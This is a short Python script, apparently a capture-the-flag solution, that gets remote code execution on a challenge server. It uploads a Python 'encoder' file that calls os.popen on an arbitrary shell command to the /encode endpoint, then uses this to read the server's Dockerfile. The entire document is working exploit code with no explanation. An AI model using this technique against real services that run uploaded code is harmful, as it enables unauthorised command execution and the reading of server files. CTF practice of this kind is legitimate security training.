import requests
import base64

url = "http://chall1.lagncra.sh:11036/"

def rce(cmd):
    res = requests.post(f"{url}/encode", data={
        'password': 'abc'
    }, files={
        'encoder': ('test.py', "print(__import__('os').popen('%s').read())" % cmd, 'text/plain')
    })

    return res.json()['output'].strip()

print(rce('cat Dockerfile'))